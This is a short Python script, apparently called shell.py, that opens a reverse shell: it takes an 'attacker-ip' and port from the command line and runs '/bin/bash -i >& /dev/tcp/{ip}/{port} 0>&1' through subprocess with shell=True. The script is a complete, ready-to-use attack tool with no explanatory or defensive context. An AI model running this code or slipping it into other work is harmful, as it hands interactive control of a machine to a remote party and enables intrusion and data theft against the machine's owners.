import sys
import subprocess

def reverse_shell(ip, port):
    bash_command = f"/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    subprocess.call(bash_command, shell=True)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python shell.py <attacker-ip> <port>")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])

    reverse_shell(ip, port)